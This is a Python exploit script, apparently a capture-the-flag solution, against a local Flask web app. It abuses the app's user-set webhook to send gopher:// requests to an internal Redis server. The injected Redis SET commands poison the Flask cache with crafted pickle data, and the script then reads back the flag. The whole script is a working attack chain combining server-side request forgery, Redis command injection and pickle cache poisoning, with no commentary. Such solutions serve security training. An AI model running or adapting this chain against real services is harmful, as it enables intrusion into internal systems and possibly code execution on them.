import base64
import hashlib
import re
import secrets
import time

import requests

HOST = 'http://localhost:8000'

def make_cache_key(space_id):
  return base64.b64encode(hashlib.md5(f'app.routes.space.num_subscriptions({space_id},)OrderedDict()'.encode()).digest())[:16].decode()

username = secrets.token_hex(16)
password = secrets.token_hex(64)
space = secrets.token_hex(16)

s = requests.Session()

# create account
assert s.post(f'{HOST}/register', data={'username': username, 'password': password}).status_code == 200

# create space
create_space = s.post(f'{HOST}/create', data={'name': space})
assert create_space.status_code == 200
space_id = int(create_space.url.split('/')[-1])

# subscribe
assert s.get(f'{HOST}/space/{space_id}/sub').status_code == 200

# set memver
command = 'SET flask_cache_app.routes.space.num_subscriptions_memver "!V\\n."%0A'
webhook = 'gopher://redis:6379/_' + command
assert len(webhook) <= 96
assert s.post(f'{HOST}/profile', data={'webhook': webhook}).status_code == 200
assert s.post(f'{HOST}/space/{space_id}/post', data={'content': ''}).status_code == 200
time.sleep(1)

# set cache
command = f'SET flask_cache_{make_cache_key(space_id)} "!capp\\nflag\\n."%0A'
webhook = 'gopher://redis:6379/_' + command
assert len(webhook) <= 96
assert s.post(f'{HOST}/profile', data={'webhook': webhook}).status_code == 200
assert s.post(f'{HOST}/space/{space_id}/post', data={'content': ''}).status_code == 200
time.sleep(1)

# get flag
flag = s.get(f'{HOST}/space/{space_id}').text
print(re.search(r'hope\{[ -z|~]+\}', flag).group(0))
